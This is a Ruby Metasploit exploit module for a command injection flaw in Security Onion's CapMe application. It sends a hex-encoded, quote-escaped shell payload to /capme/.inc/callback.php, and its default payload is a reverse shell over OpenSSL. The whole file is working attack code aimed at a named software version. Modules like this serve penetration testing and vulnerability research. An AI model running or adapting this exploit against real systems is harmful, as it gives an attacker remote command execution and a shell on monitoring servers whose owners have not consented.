require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Security Onion Command Injection',
      'Description'    => %q{
	This module exploits a command injection flaw in Security Onion. The CapMe
	application does not properly filter escape characters allowing for arbitrary
	system commands to be executed.
      },
      'Author'         => [ 'Mario Ceballos' ],
      'License'        => 'Private',
      'References'     => [ 'URL', 'https://techanarchy.net/2016/02/security-onion-command-injection-vulnerability/' ],
      'Privileged'     => false,
      'DefaultOptions' =>
	{
		'PAYLOAD' => 'cmd/unix/reverse_openssl',
	},
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 1024,
          'Compat'      =>
            {
              'PayloadType' => 'cmd cmd_bash',
              'RequiredCmd' => 'openssl',
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'securityonion-12.04.5.3-20150825.iso', { }]],
      'DisclosureDate' => 'Jan 3 2017', 
      'DefaultTarget' => 0))

    register_options(
      [
      OptString.new('CMDURI', [true, "The full URI path with the parameter", "/capme/.inc/callback.php?d="]),
      OptBool.new('SSL', [true, 'Use SSL', true]),
      Opt::RPORT(443)
      ], self.class)
  end

  def exploit
    uri = datastore['CMDURI'].to_s
    source =  Rex::Text.to_hex(datastore['RHOST']).gsub("\\x","").strip
    port =  Rex::Text.rand_text_numeric(4)
    p = Rex::Text.to_hex("'; #{payload.encoded} ;'").gsub("\\x","").strip

    url =  "#{source}-#{port}-#{source}-"
    url << "#{p}-1452631144-1452631144-757365726e616d65-"
    url << "70617373776f7264-656c7361-746370666c6f77"

    print_status("Sending request to service...")	
    res = send_request_raw( {
      'method' => 'GET',
      'uri'    => uri + url,
    }, 30)

    handler
  end

end
